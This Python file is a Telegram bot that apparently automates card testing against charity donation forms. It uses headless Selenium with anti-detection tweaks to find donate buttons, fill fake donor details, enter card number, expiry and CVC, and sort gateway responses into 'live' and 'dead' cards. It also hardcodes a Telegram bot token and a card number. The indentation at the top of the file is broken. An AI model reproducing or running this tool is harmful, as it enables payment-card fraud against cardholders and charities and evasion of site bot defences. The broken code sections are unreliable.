import telebot
import time
import threading
from telebot import types
import requests
import random
import json
import re
import base64
import os
import gc
import uuid
from datetime import datetime
from urllib.parse import urlparse
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

try:
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support.ui import Select
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.action_chains import ActionChains
from selenium.common.exceptions import TimeoutException, NoSuchElementException, ElementNotInteractableException, StaleElementReferenceException, WebDriverException, NoSuchFrameException, ElementClickInterceptedException
HAS_SELENIUM = True
except ImportError:
HAS_SELENIUM = False
print("Selenium not installed! Run: pip install selenium")

try:
from webdriver_manager.chrome import ChromeDriverManager
HAS_WEBDRIVER_MANAGER = True
except ImportError:
HAS_WEBDRIVER_MANAGER = False
print("webdriver-manager not installed! Run: pip install webdriver-manager")

try:
from fake_useragent import UserAgent
uu = UserAgent()
HAS_FAKE_UA = True
except:
HAS_FAKE_UA = False
class SimpleUA:
def init(self):
self.agents = [
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
]
def random(self):
return random.choice(self.agents)

token = '8689698569:AAEKe4aG2sNS0yDiGg0OVFD2TfCHSLwLlDc'
bot = telebot.TeleBot(token, parse_mode="HTML")
admin = 6843321125
admins = ['6843321125']
OWNER_ID = 6843321125

processing_status = {}

if not os.path.exists('blockusers.txt'):
with open('blockusers.txt', 'w') as f:
f.write('')

TEST_CARD = "5104040287872188|12|27|951"
TEST_CARD_NUMBER = "5104040287872188"
TEST_CARD_EXPIRY_MONTH = "12"
TEST_CARD_EXPIRY_YEAR = "27"
TEST_CARD_CVC = "951"

error_counter = {'502': 0, '429': 0, '500': 0, 'timeout': 0, 'connection': 0}

def track_error(error_type):
if error_type in error_counter:
error_counter[error_type] += 1
if error_counter[error_type] > 10:
print(f"Too many {error_type} errors! Waiting 60s...")
time.sleep(60)
error_counter[error_type] = 0

def reset_error_counter():
for key in error_counter:
error_counter[key] = 0

def safe_edit_message(chat_id, message_id, text, parse_mode="HTML", retries=5):
for i in range(retries):
try:
result = bot.edit_message_text(chat_id=chat_id, message_id=message_id, text=text, parse_mode=parse_mode)
reset_error_counter()
return result
except Exception as e:
error_str = str(e)
if "429" in error_str:
track_error('429')
try:
wait_time = int(error_str.split("retry after ")[1].split(")")[0]) if "retry after" in error_str else 30
except:
wait_time = 30
time.sleep(min(wait_time + 5, 65))
elif "502" in error_str or "Bad Gateway" in error_str:
track_error('502')
time.sleep(5 * (i + 1))
elif "500" in error_str or "Internal Server Error" in error_str:
track_error('500')
time.sleep(3 * (i + 1))
elif "Timed out" in error_str or "timeout" in error_str.lower():
track_error('timeout')
time.sleep(2 * (i + 1))
elif "Connection" in error_str:
track_error('connection')
time.sleep(3 * (i + 1))
else:
break
return None

def safe_send_message(chat_id, text, parse_mode="HTML", retries=5, reply_markup=None):
for i in range(retries):
try:
result = bot.send_message(chat_id, text, parse_mode=parse_mode, reply_markup=reply_markup)
reset_error_counter()
return result
except Exception as e:
error_str = str(e)
if "429" in error_str:
track_error('429')
try:
wait_time = int(error_str.split("retry after ")[1].split(")")[0]) if "retry after" in error_str else 30
except:
wait_time = 30
time.sleep(min(wait_time + 5, 65))
elif "502" in error_str or "Bad Gateway" in error_str:
track_error('502')
time.sleep(5 * (i + 1))
elif "500" in error_str or "Internal Server Error" in error_str:
track_error('500')
time.sleep(3 * (i + 1))
elif "Timed out" in error_str or "timeout" in error_str.lower():
track_error('timeout')
time.sleep(2 * (i + 1))
elif "Connection" in error_str:
track_error('connection')
time.sleep(3 * (i + 1))
else:
break
return None

def safe_send_document(chat_id, file_path, caption="", parse_mode="HTML", retries=5):
for i in range(retries):
try:
with open(file_path, 'rb') as f:
result = bot.send_document(chat_id, f, caption=caption, parse_mode=parse_mode)
reset_error_counter()
return result
except Exception as e:
error_str = str(e)
if "429" in error_str:
track_error('429')
time.sleep(30)
elif "502" in error_str:
track_error('502')
time.sleep(5 * (i + 1))
else:
break
return None

def safe_send_photo(chat_id, file_path, caption="", parse_mode="HTML", retries=5):
for i in range(retries):
try:
with open(file_path, 'rb') as f:
result = bot.send_photo(chat_id, f, caption=caption, parse_mode=parse_mode)
reset_error_counter()
return result
except Exception as e:
error_str = str(e)
if "429" in error_str:
track_error('429')
time.sleep(30)
elif "502" in error_str:
track_error('502')
time.sleep(5 * (i + 1))
else:
break
return None

def safe_get_file(file_id, retries=5):
for i in range(retries):
try:
return bot.get_file(file_id)
except Exception as e:
error_str = str(e)
if "502" in error_str:
time.sleep(5 * (i + 1))
elif "429" in error_str:
time.sleep(30)
else:
break
return None

def safe_download_file(file_path, retries=5):
for i in range(retries):
try:
return bot.download_file(file_path)
except Exception as e:
error_str = str(e)
if "502" in error_str:
time.sleep(5 * (i + 1))
elif "429" in error_str:
time.sleep(30)
else:
break
return None

LIVE_RESPONSES = [
'INSUFFICIENT_FUNDS', 'Payer cannot pay', 'CHARGE 1.0', 'CHARGE 1.00$',
'RESTRICTED_OR_INACTIVE_ACCOUNT', 'PAYEE_BLOCKED_TRANSACTION',
'SUSPECTED_FRAUD', 'ORDER_NOT_APPROVED', 'TRANSACTION_REFUSED',
'PAYER_ACTION_REQUIRED', 'INSTRUMENT_DECLINED', 'CARD_DECLINED',
'PAYMENT_DENIED', 'PAYER_CANNOT_PAY', 'DO_NOT_HONOR',
'ACCOUNT_CLOSED', 'LOST_OR_STOLEN', 'CVV2_FAILURE',
'INVALID_ACCOUNT', 'REATTEMPT_NOT_PERMITTED', 'ACCOUNT_BLOCKED_BY_ISSUER',
'GENERIC_DECLINE', 'COMPLIANCE_VIOLATION', 'TRANSACTION_NOT_PERMITTED',
'INVALID_TRANSACTION', 'SECURITY_VIOLATION', 'EXPIRED_CARD',
'EXPIRED_CREDIT_CARD', 'CRYPTOGRAPHIC_FAILURE',
'TRANSACTION_CANNOT_BE_COMPLETED', 'DECLINED_PLEASE_RETRY',
'TX_ATTEMPTS_EXCEED_LIMIT', 'PAYER_ACCOUNT_LOCKED_OR_CLOSED',
'PAYER_BLOCKED_TRANSACTION', 'PAYER_ACCOUNT_RESTRICTED',
'PAYER_ACCOUNT_INVALID', 'INVALID_PAYMENT_METHOD',
'DECLINED_DUE_TO_UPDATED_ACCOUNT', 'INVALID_OR_RESTRICTED_CARD',
'TRANSACTION_LIMIT_EXCEEDED', 'NOT_ENABLED_FOR_CARD_PROCESSING',
'CARD_TYPE_NOT_SUPPORTED', 'PAYEE_ACCOUNT_RESTRICTED',
'PAYEE_ACCOUNT_INVALID', 'PAYEE_ACCOUNT_LOCKED_OR_CLOSED',
'UNSUPPORTED_INTENT', 'UNSUPPORTED_PAYMENT_INSTRUMENT',
'MAX_NUMBER_OF_PAYMENT_ATTEMPTS_EXCEEDED', 'CVV2_FAILURE_INDICATOR',
'CARD_EXPIRED', 'INVALID_CARD_NUMBER', 'INVALID_EXPIRATION_DATE',
'CARD_NOT_SUPPORTED', 'AUTHORIZATION_DENIED', 'AUTHORIZATION_EXPIRED',
'AUTHORIZATION_VOIDED',
'Your card has insufficient funds',
'There was an issue with your donation transaction',
'Your card was declined',
'insufficient_funds',
'card_declined',
'transaction_not_allowed',
'Your card does not support this type of purchase',
"Your card's security code is incorrect",
"Your card's expiration date is incorrect",
'Your card number is incorrect',
'Your card has expired',
'card_error',
'expired_card',
'incorrect_cvc',
'processing_error',
'card_not_supported',
'currency_not_supported',
'do_not_honor',
'lost_card',
'stolen_card',
'pickup_card',
'restricted_card',
'security_violation',
'service_not_allowed',
'stop_payment_order',
'testmode_decline',
'fraudulent',
'merchant_blacklist',
'Please check your payment method',
'Insufficient Funds',
'Card Declined',
'Transaction Declined',
'nmi_declined',
'Invalid Card Number',
'Invalid CVV',
'Invalid Expiration',
'Card Expired',
'Restricted Card',
'Call Issuer',
'Pick Up Card',
'Lost Card',
'Stolen Card',
'Invalid Transaction',
'Transaction Not Allowed',
'Card Not Supported',
'Insufficient Funds Available',
'Over Limit',
'Refer to Card Issuer'
]

DEAD_RESPONSES = [
'DECLINED', 'Invalid card format',
'Error:', 'invalid_client', 'Client Authentication failed',
'invalid_grant', 'unsupported_grant_type', 'invalid_scope',
'No form fields', 'No au', 'No PayPal data', 'Connection failed',
'Decode error', 'Invalid URL', 'UserAgent', 'ImportError',
'Expecting value', 'UNPROCESSABLE_ENTITY', 'VALIDATION_ERROR',
'INVALID_REQUEST', 'AUTHENTICATION_FAILURE', 'NOT_AUTHORIZED',
'Selenium not installed', 'Page Load Error', 'Browser Error',
'INVALID_GATEWAY', 'UNKNOWN_SITE_RESPONSE',
'CLOUDFLARE_DETECTED', 'CAPTCHA_DETECTED',
'NO_DONATION_FOUND', 'NO_FORM_FOUND', 'NO_PAYMENT_METHOD',
'Driver Setup Failed'
]

DONATE_KEYWORDS = [
'donate', 'donation', 'donations', 'donor', 'donors',
'give', 'giving', 'gift', 'gifts', 'contribute',
'contribution', 'support us', 'help us', 'back us',
'fund us', 'fundraise', 'fundraiser', 'fundraising',
'charity', 'charitable', 'sponsor', 'sponsorship',
'philanthropy', 'make a donation', 'make a gift',
'give now', 'donate now', 'donate today',
'support our', 'help support', 'support the',
'donate to', 'give to', 'contribute to',
'support us today', 'make a difference',
'تبرع', 'تبرّع', 'تبرعات', 'متبرع', 'متبرعين',
'عطاء', 'خير', 'صدقة', 'صدقات', 'زكاة',
'دعم', 'ادعم', 'ساهم', 'مساهمة', 'تمويل',
'تبرع الآن', 'تبرع اليوم',
'donar', 'donación', 'donativo', 'donner', 'don',
'spenden', 'spende', 'donare', 'donazione',
'doar', 'doação', 'doneren', 'donatie'
]

PAYMENT_KEYWORDS = [
'payment', 'pay', 'pay now', 'pay online',
'checkout', 'check out', 'purchase', 'buy',
'order', 'subscribe', 'subscription',
'billing', 'invoice', 'transaction',
'دفع', 'ادفع', 'سداد', 'سدد', 'شراء',
'اشتراك', 'فاتورة', 'معاملة',
'paypal', 'stripe', 'braintree', 'square',
'authorize', 'authorize.net', '2checkout',
'nmi', 'worldpay', 'adyen', 'klarna',
'apple pay', 'google pay', 'amazon pay',
'credit card', 'debit card', 'visa', 'mastercard',
'بطاقة', 'بطاقة ائتمان', 'بطاقة بنكية',
'givewp', 'give-wp', 'woocommerce', 'woo',
'donorbox', 'justgiving', 'gofundme',
'fundly', 'classy', 'qgiv'
]

class HumanLikeSelenium:
    """بوت ذكي يتعامل مع أي فورم تبرع - أي موقع"""

    def __init__(self, url, headless=True, progress_callback=None, screenshot_callback=None):
        self.url = url
        self.headless = headless
        self.driver = None
        self.tokens = {}
        self.html = ""
        self.form_data = {}
        self.progress_callback = progress_callback
        self.screenshot_callback = screenshot_callback

        self.first_names = ["James", "John", "Robert", "Michael", "William", "David", "Richard", "Joseph"]
        self.last_names = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis"]
        self.email = f"{random.choice(self.first_names).lower()}{random.randint(100,999)}@gmail.com"
        self.phone = f"212555{random.randint(1000, 9999)}"
        self.address = "123 Main Street"
        self.city = "New York"
        self.state = "NY"
        self.zip_code = "10001"
        self.country = "US"

    def progress(self, message):
        print(f"📢 {message}")
        if self.progress_callback:
            try:
                self.progress_callback(message)
            except:
                pass

    def screenshot(self, name="screenshot"):
        try:
            if self.screenshot_callback and self.driver:
                filename = f"/tmp/{name}_{int(time.time())}.png"
                self.driver.save_screenshot(filename)
                self.screenshot_callback(filename, name)
                return filename
        except:
            pass
        return None

    def get_random_ua(self):
        try:
            return uu.random
        except:
            return 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'

    def setup_driver(self):
        try:
            options = Options()
            if self.headless:
                options.add_argument('--headless=new')
            options.add_argument('--no-sandbox')
            options.add_argument('--disable-dev-shm-usage')
            options.add_argument('--disable-gpu')
            options.add_argument('--disable-setuid-sandbox')
            options.add_argument('--disable-software-rasterizer')
            options.add_argument('--disable-extensions')
            options.add_argument('--disable-plugins')
            options.add_argument('--disable-sync')
            options.add_argument('--window-size=1920,1080')
            options.add_argument('--log-level=3')
            options.add_argument('--disable-blink-features=AutomationControlled')
            options.add_experimental_option("excludeSwitches", ["enable-automation"])
            options.add_experimental_option('useAutomationExtension', False)
            options.add_argument(f'user-agent={self.get_random_ua()}')

            prefs = {
                "profile.managed_default_content_settings.images": 2,
                "profile.default_content_setting_values.notifications": 2
            }
            options.add_experimental_option("prefs", prefs)
            options.page_load_strategy = 'eager'

            try:
                if os.path.exists('/usr/bin/chromedriver'):
                    service = Service('/usr/bin/chromedriver')
                    options.binary_location = '/usr/bin/chromium'
                    self.driver = webdriver.Chrome(service=service, options=options)
                elif HAS_WEBDRIVER_MANAGER:
                    try:
                        service = Service(ChromeDriverManager().install())
                        self.driver = webdriver.Chrome(service=service, options=options)
                    except:
                        self.driver = webdriver.Chrome(options=options)
                else:
                    self.driver = webdriver.Chrome(options=options)
            except Exception as e:
                print(f"Driver launch error: {str(e)[:150]}")
                return False

            try:
                self.driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
                self.driver.execute_cdp_cmd('Network.setUserAgentOverride', {"userAgent": self.get_random_ua()})
            except:
                pass

            self.driver.set_page_load_timeout(25)
            self.driver.implicitly_wait(1)
            return True
        except Exception as e:
            print(f"Driver setup error: {str(e)[:100]}")
            return False

    def click_safely(self, element):
        if element is None:
            return False
        try:
            self.driver.execute_script("arguments[0].scrollIntoView({block: 'center'});", element)
            time.sleep(0.2)
        except:
            pass
        try:
            element.click()
            return True
        except:
            pass
        try:
            self.driver.execute_script("arguments[0].click();", element)
            return True
        except:
            pass
        try:
            ActionChains(self.driver).move_to_element(element).click().perform()
            return True
        except:
            pass
        return False

    def fill_safely(self, element, value):
        if element is None:
            return False
        try:
            self.driver.execute_script("arguments[0].scrollIntoView({block: 'center'});", element)
            time.sleep(0.15)
        except:
            pass
        try:
            element.clear()
            time.sleep(0.1)
            element.send_keys(str(value))
            return True
        except:
            pass
        try:
            self.driver.execute_script("var el = arguments[0]; el.value = arguments[1]; el.dispatchEvent(new Event('input', {bubbles: true})); el.dispatchEvent(new Event('change', {bubbles: true})); el.dispatchEvent(new Event('blur', {bubbles: true}));", element, str(value))
            return True
        except:
            pass
        return False

    def detect_cloudflare(self):
        try:
            title = self.driver.title.lower()
            page_source = self.driver.page_source.lower()[:5000]
            indicators = ['cloudflare', 'checking your browser', 'just a moment', 'ddos protection', 'verifying you are human', 'cf-challenge', 'cf_chl_opt', 'challenge-platform']
            for ind in indicators:
                if ind in title or ind in page_source:
                    return True
            return False
        except:
            return False

    def detect_captcha(self):
        try:
            page_source = self.driver.page_source.lower()
            indicators = ['g-recaptcha', 'hcaptcha', 'recaptcha', 'cf-turnstile', 'captcha', "i'm not a robot", 'verify you are human', 'data-sitekey']
            for ind in indicators:
                if ind in page_source:
                    try:
                        els = self.driver.find_elements(By.CSS_SELECTOR, '[class*="captcha"], [id*="captcha"], .g-recaptcha, .hcaptcha, [class*="turnstile"]')
                        for el in els:
                            if el.is_displayed():
                                return True
                    except:
                        pass
            return False
        except:
            return False

    def quick_scan(self):
        try:
            try:
                WebDriverWait(self.driver, 8).until(EC.presence_of_element_located((By.TAG_NAME, 'body')))
            except:
                pass
            page_text = self.driver.page_source.lower()
            found = []
            for kw in DONATE_KEYWORDS + PAYMENT_KEYWORDS:
                if kw.lower() in page_text:
                    found.append(kw)
                    if len(found) >= 3:
                        break
            if found:
                self.progress(f"✅ Found: {', '.join(found[:3])}")
                return True
            return False
        except:
            return False

    def find_any_button(self):
        buttons = []
        try:
            all_els = []
            try:
                all_els.extend(self.driver.find_elements(By.TAG_NAME, 'button'))
                all_els.extend(self.driver.find_elements(By.TAG_NAME, 'a'))
                all_els.extend(self.driver.find_elements(By.CSS_SELECTOR, 'input[type="submit"]'))
                all_els.extend(self.driver.find_elements(By.CSS_SELECTOR, 'input[type="button"]'))
                all_els.extend(self.driver.find_elements(By.CSS_SELECTOR, '[role="button"]'))
                all_els.extend(self.driver.find_elements(By.CSS_SELECTOR, '[class*="donate"]'))
                all_els.extend(self.driver.find_elements(By.CSS_SELECTOR, '[class*="give"]'))
                all_els.extend(self.driver.find_elements(By.CSS_SELECTOR, '[class*="pay"]'))
            except:
                pass

            for el in all_els:
                try:
                    if not el.is_displayed() or not el.is_enabled():
                        continue
                    text = (el.text or el.get_attribute('value') or el.get_attribute('aria-label') or '').lower().strip()
                    if not text or len(text) > 100:
                        continue
                    for kw in DONATE_KEYWORDS + PAYMENT_KEYWORDS:
                        if kw in text:
                            buttons.append(el)
                            break
                except:
                    continue
        except:
            pass

        try:
            iframes = self.driver.find_elements(By.TAG_NAME, 'iframe')
            for iframe in iframes:
                try:
                    self.driver.switch_to.frame(iframe)
                    time.sleep(0.3)
                    try:
                        inner = []
                        inner.extend(self.driver.find_elements(By.TAG_NAME, 'button'))
                        inner.extend(self.driver.find_elements(By.TAG_NAME, 'a'))
                        for el in inner:
                            try:
                                if not el.is_displayed() or not el.is_enabled():
                                    continue
                                text = (el.text or el.get_attribute('value') or '').lower().strip()
                                if not text or len(text) > 100:
                                    continue
                                for kw in DONATE_KEYWORDS + PAYMENT_KEYWORDS:
                                    if kw in text:
                                        buttons.append(el)
                                        break
                            except:
                                continue
                    except:
                        pass
                    self.driver.switch_to.default_content()
                except:
                    try:
                        self.driver.switch_to.default_content()
                    except:
                        pass
        except:
            pass

        unique = []
        seen = set()
        for b in buttons:
            try:
                bid = id(b)
                if bid not in seen:
                    seen.add(bid)
                    unique.append(b)
            except:
                continue
        return unique

    def click_any_donate_button(self):
        try:
            buttons = self.find_any_button()
            if not buttons:
                self.progress("⚠️ No buttons found")
                return False
            self.progress(f"🎯 Found {len(buttons)} buttons")
            for i, btn in enumerate(buttons[:3]):
                try:
                    try:
                        btn_text = btn.text[:40] if btn.text else "(no text)"
                    except:
                        btn_text = "(unknown)"
                    self.progress(f"🖱️ Trying: {btn_text}")
                    if self.click_safely(btn):
                        time.sleep(2)
                        return True
                except:
                    continue
            return False
        except:
            return False

    def close(self):
        try:
            if self.driver:
                self.driver.quit()
        except:
            pass


    def fill_any_form(self):
        all_inputs = []
        try:
            all_inputs.extend(self.driver.find_elements(By.CSS_SELECTOR, 'input[type="text"]'))
            all_inputs.extend(self.driver.find_elements(By.CSS_SELECTOR, 'input[type="email"]'))
            all_inputs.extend(self.driver.find_elements(By.CSS_SELECTOR, 'input[type="tel"]'))
            all_inputs.extend(self.driver.find_elements(By.CSS_SELECTOR, 'input[type="number"]'))
            all_inputs.extend(self.driver.find_elements(By.CSS_SELECTOR, 'input[type="search"]'))
        except:
            pass

        filled_email = False
        filled_first = False
        filled_last = False
        filled_amount = False

        for el in all_inputs:
            try:
                if not el.is_displayed() or not el.is_enabled():
                    continue
                name = (el.get_attribute('name') or '').lower()
                id_ = (el.get_attribute('id') or '').lower()
                placeholder = (el.get_attribute('placeholder') or '').lower()
                type_ = (el.get_attribute('type') or '').lower()
                combined = f"{name} {id_} {placeholder}"

                if not filled_first and any(k in combined for k in ['first', 'fname', 'given']):
                    if self.fill_safely(el, random.choice(self.first_names)):
                        filled_first = True
                        self.progress("📝 First name")
                        continue

                if not filled_last and any(k in combined for k in ['last', 'lname', 'family', 'surname']):
                    if self.fill_safely(el, random.choice(self.last_names)):
                        filled_last = True
                        self.progress("📝 Last name")
                        continue

                if not filled_email and (type_ == 'email' or any(k in combined for k in ['email', 'mail'])):
                    if self.fill_safely(el, self.email):
                        filled_email = True
                        self.progress("📝 Email")
                        continue

                if not filled_amount and any(k in combined for k in ['amount', 'total', 'value']):
                    if self.fill_safely(el, "5.00"):
                        filled_amount = True
                        self.progress("💰 Amount")
                        continue

                if any(k in combined for k in ['phone', 'tel', 'mobile']):
                    self.fill_safely(el, self.phone)
                    continue

                if any(k in combined for k in ['address', 'street']):
                    self.fill_safely(el, self.address)
                    continue

                if 'city' in combined:
                    self.fill_safely(el, self.city)
                    continue

                if any(k in combined for k in ['zip', 'postal']):
                    self.fill_safely(el, self.zip_code)
                    continue

                if type_ in ['text', 'email', 'tel', 'number']:
                    if not (el.get_attribute('value') or '').strip():
                        self.fill_safely(el, random.choice(self.first_names))
            except:
                continue

        return True

    def accept_any_terms(self):
        try:
            checkboxes = self.driver.find_elements(By.CSS_SELECTOR, 'input[type="checkbox"]')
            clicked = 0
            for cb in checkboxes:
                try:
                    if cb.is_displayed() and not cb.is_selected():
                        if self.click_safely(cb):
                            clicked += 1
                            time.sleep(0.2)
                except:
                    continue
            if clicked:
                self.progress(f"☑️ Accepted {clicked} checkboxes")
            return True
        except:
            return False

    def pick_amount(self):
        try:
            for selector in ['button[data-amount]', '[class*="amount"]', '[class*="preset"]', '[class*="level"]']:
                try:
                    els = self.driver.find_elements(By.CSS_SELECTOR, selector)
                    for el in els:
                        if el.is_displayed():
                            txt = (el.text or '').lower()
                            if any(x in txt for x in ['$5', '$10', '5.00', '10.00']):
                                if self.click_safely(el):
                                    self.progress("💰 Picked amount")
                                    return True
                except:
                    continue
            return False
        except:
            return False

    def select_credit_card(self):
        try:
            for selector in ['input[type="radio"][value*="card"]', 'input[type="radio"][id*="card"]', 'input[type="radio"][value*="credit"]', '[class*="credit-card"]', '[class*="card-option"]']:
                try:
                    els = self.driver.find_elements(By.CSS_SELECTOR, selector)
                    for el in els:
                        if el.is_displayed() and el.is_enabled():
                            if self.click_safely(el):
                                self.progress("💳 Credit Card selected")
                                time.sleep(1)
                                return True
                except:
                    continue
            for kw in ['credit card', 'card payment', 'pay with card', 'debit card', 'pay with credit']:
                try:
                    xpath = f"//*[contains(translate(text(), 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', 'abcdefghijklmnopqrstuvwxyz'), '{kw}')]"
                    els = self.driver.find_elements(By.XPATH, xpath)
                    for el in els[:3]:
                        if el.is_displayed() and el.is_enabled():
                            if self.click_safely(el):
                                self.progress(f"💳 {kw}")
                                time.sleep(1)
                                return True
                except:
                    continue
            return False
        except:
            return False

    def click_any_pay_button(self):
        try:
            keywords = ['donate', 'give', 'submit', 'pay', 'continue', 'next', 'complete', 'confirm', 'proceed']
            for kw in keywords:
                try:
                    xpath = f"//button[contains(translate(text(), 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', 'abcdefghijklmnopqrstuvwxyz'), '{kw}')] | //input[@type='submit']"
                    els = self.driver.find_elements(By.XPATH, xpath)
                    for el in els:
                        if el.is_displayed() and el.is_enabled():
                            if self.click_safely(el):
                                self.progress(f"🖱️ Clicked: {kw}")
                                time.sleep(2)
                                return True
                except:
                    continue
            for sel in ['button[type="submit"]', 'input[type="submit"]', '.give-submit', '[class*="submit"]']:
                try:
                    els = self.driver.find_elements(By.CSS_SELECTOR, sel)
                    for el in els:
                        if el.is_displayed() and el.is_enabled():
                            if self.click_safely(el):
                                self.progress("🖱️ Clicked submit")
                                time.sleep(2)
                                return True
                except:
                    continue
            return False
        except:
            return False

    def fill_credit_card_info(self, card_number, exp_month, exp_year, cvc):
        try:
            time.sleep(2)
            filled = {'card': False, 'month': False, 'year': False, 'cvv': False, 'name': False}

            frames_to_try = [None]
            try:
                iframes = self.driver.find_elements(By.TAG_NAME, 'iframe')
                for i in range(len(iframes)):
                    frames_to_try.append(i)
            except:
                pass

            for frame_idx in frames_to_try:
                try:
                    if frame_idx is not None:
                        iframes = self.driver.find_elements(By.TAG_NAME, 'iframe')
                        if frame_idx >= len(iframes):
                            continue
                        self.driver.switch_to.frame(iframes[frame_idx])
                        time.sleep(0.3)

                    if not filled['card']:
                        for sel in ['input[name*="card" i]', 'input[id*="card" i]', 'input[placeholder*="card" i]', 'input[autocomplete="cc-number"]', 'input[data-payment*="card"]', 'input[aria-label*="card" i]']:
                            try:
                                els = self.driver.find_elements(By.CSS_SELECTOR, sel)
                                for el in els:
                                    if el.is_displayed():
                                        if self.fill_safely(el, card_number):
                                            filled['card'] = True
                                            self.progress("💳 Card number")
                                            break
                                if filled['card']:
                                    break
                            except:
                                continue

                    if not filled['month']:
                        for sel in ['input[name*="exp" i]', 'input[id*="exp" i]', 'input[placeholder*="MM" i]', 'input[autocomplete="cc-exp-month"]', 'input[name*="month" i]', 'select[name*="month" i]']:
                            try:
                                els = self.driver.find_elements(By.CSS_SELECTOR, sel)
                                for el in els:
                                    if el.is_displayed():
                                        tag = el.tag_name.lower()
                                        if tag == 'select':
                                            try:
                                                Select(el).select_by_value(exp_month)
                                                filled['month'] = True
                                            except:
                                                try:
                                                    Select(el).select_by_visible_text(exp_month)
                                                    filled['month'] = True
                                                except:
                                                    pass
                                        else:
                                            if self.fill_safely(el, exp_month):
                                                filled['month'] = True
                                        if filled['month']:
                                            break
                                if filled['month']:
                                    break
                            except:
                                continue

                    if not filled['year']:
                        for sel in ['input[name*="year" i]', 'input[id*="year" i]', 'input[placeholder*="YY" i]', 'input[autocomplete="cc-exp-year"]', 'select[name*="year" i]']:
                            try:
                                els = self.driver.find_elements(By.CSS_SELECTOR, sel)
                                for el in els:
                                    if el.is_displayed():
                                        tag = el.tag_name.lower()
                                        if tag == 'select':
                                            try:
                                                Select(el).select_by_value(exp_year)
                                                filled['year'] = True
                                            except:
                                                try:
                                                    Select(el).select_by_visible_text(f"20{exp_year}")
                                                    filled['year'] = True
                                                except:
                                                    try:
                                                        Select(el).select_by_visible_text(exp_year)
                                                        filled['year'] = True
                                                    except:
                                                        pass
                                        else:
                                            if self.fill_safely(el, exp_year):
                                                filled['year'] = True
                                        if filled['year']:
                                            break
                                if filled['year']:
                                    break
                            except:
                                continue

                    if not filled['cvv']:
                        for sel in ['input[name*="cvv" i]', 'input[name*="cvc" i]', 'input[name*="security" i]', 'input[id*="cvv" i]', 'input[placeholder*="CVV" i]', 'input[placeholder*="CVC" i]', 'input[autocomplete="cc-csc"]']:
                            try:
                                els = self.driver.find_elements(By.CSS_SELECTOR, sel)
                                for el in els:
                                    if el.is_displayed():
                                        if self.fill_safely(el, cvc):
                                            filled['cvv'] = True
                                            break
                                if filled['cvv']:
                                    break
                            except:
                                continue

                    if not filled['name']:
                        for sel in ['input[name*="cardholder" i]', 'input[placeholder*="holder" i]', 'input[placeholder*="name on card" i]', 'input[name*="card_name" i]']:
                            try:
                                els = self.driver.find_elements(By.CSS_SELECTOR, sel)
                                for el in els:
                                    if el.is_displayed():
                                        if self.fill_safely(el, f"{random.choice(self.first_names)} {random.choice(self.last_names)}"):
                                            filled['name'] = True
                                            break
                                if filled['name']:
                                    break
                            except:
                                continue

                    if frame_idx is not None:
                        self.driver.switch_to.default_content()
                except:
                    try:
                        self.driver.switch_to.default_content()
                    except:
                        pass

            self.progress(f"💳 Filled: {sum(filled.values())}/5")
            return True
        except Exception as e:
            print(f"Error fill_credit_card_info: {e}")
            return False

    def wait_for_result(self, timeout=15):
        try:
            start = time.time()
            while time.time() - start < timeout:
                try:
                    text = self.driver.find_element(By.TAG_NAME, 'body').text
                    text_lower = text.lower()

                    for live in LIVE_RESPONSES:
                        if live.lower() in text_lower:
                            return live

                    for success in ['thank you', 'success', 'complete', 'approved', 'confirmed', 'receipt']:
                        if success in text_lower:
                            return "CHARGE 1.0"
                except:
                    pass
                time.sleep(1)

            try:
                text = self.driver.find_element(By.TAG_NAME, 'body').text
            except:
                text = ""

            html = self.driver.page_source
            return self.parse_response(text, html)
        except Exception as e:
            return f"Wait Error: {str(e)[:100]}"

    def parse_response(self, text, html):
        text_lower = text.lower()
        json_patterns = [r'"issue"\s*:\s*"([^"]+)"', r'"error"\s*:\s*"([^"]+)"', r'"message"\s*:\s*"([^"]+)"', r'"name"\s*:\s*"([^"]+)"']
        for pattern in json_patterns:
            matches = re.findall(pattern, html, re.IGNORECASE)
            for match in matches:
                match_upper = match.upper()
                for live in LIVE_RESPONSES:
                    if live.upper() in match_upper:
                        if 'INSUFFICIENT' in match_upper:
                            return "INSUFFICIENT_FUNDS"
                        if 'ORDER_NOT_APPROVED' in match_upper:
                            return "Payer cannot pay for this transaction."
                        return live
        for live in LIVE_RESPONSES:
            if live.lower() in text_lower:
                if 'insufficient' in live.lower():
                    return "INSUFFICIENT_FUNDS"
                return live
        if text.strip():
            return f"Site: {' '.join(text.split())[:200]}"
        return "UNKNOWN_SITE_RESPONSE"

    def extract_tokens(self):
        html = self.html
        patterns = [r'client-id=["\']([^"\']+)["\']', r'client_id["\']?\s*[:=]\s*["\']([^"\']+)["\']', r'data-client-id=["\']([^"\']+)["\']', r'clientId["\']?\s*[:=]\s*["\']([A-Za-z0-9_-]{20,})["\']']
        for pattern in patterns:
            match = re.search(pattern, html, re.IGNORECASE)
            if match:
                self.tokens['client_id'] = match.group(1)
                break

        token_patterns = [r'data-client-token=["\']([^"\']+)["\']', r'client-token=["\']([^"\']+)["\']', r'client_token=["\']([^"\']+)["\']']
        for pattern in token_patterns:
            match = re.search(pattern, html, re.IGNORECASE)
            if match:
                enc = match.group(1)
                try:
                    padded = enc + '=' * (-len(enc) % 4)
                    decoded = base64.b64decode(padded).decode('utf-8', errors='ignore')
                    token_match = re.search(r'"accessToken":"([^"]+)"', decoded)
                    if token_match:
                        self.tokens['access_token'] = token_match.group(1)
                        break
                except:
                    pass
